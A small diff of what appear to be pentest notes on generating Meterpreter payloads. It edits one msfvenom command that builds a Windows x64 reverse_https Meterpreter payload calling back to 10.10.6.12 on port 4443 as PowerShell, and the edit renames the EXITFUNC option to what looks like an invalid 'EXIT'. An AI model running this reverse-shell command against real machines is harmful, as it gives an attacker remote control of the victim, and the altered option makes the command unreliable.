@@ -3,7 +3,7 @@ password: @Hide01
 # generating payloads from meterpreter
 
 ```s
-    msfvenom -p windows/x64/meterpreter/reverse_https -a x64 LHOST=10.10.6.12 LPORT=4443 EXITFUNC=thread -f ps1.
+    msfvenom -p windows/x64/meterpreter/reverse_https -a x64 LHOST=10.10.6.12 LPORT=4443 EXIT=thread -f ps1.
 ```
 for starting reverse handler in msfconsole use
 ```s
